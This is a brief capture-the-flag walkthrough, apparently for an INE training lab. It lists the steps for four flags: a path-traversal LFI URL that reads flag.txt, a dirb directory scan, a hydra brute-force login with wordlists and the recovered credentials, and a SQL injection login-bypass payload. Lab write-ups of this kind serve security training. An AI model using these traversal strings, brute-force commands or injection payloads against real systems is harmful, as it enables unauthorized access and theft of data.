# Flag 1
Trying LFI on the url
```
http://target.ine.local/view_file?file=../../../../flag.txt
```
# Flag 2
```
dirb http://target.ine.local
```
Go to http://demo.ine.local/secured
then http://demo.ine.local/secured/flag.txt
# Flag 3
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt demo.ine.local 80
```
Login with the found credentials
guest | butterfly
# Flag 4
login with admin and sql injection paylaod
```
' OR 1=1 --
```
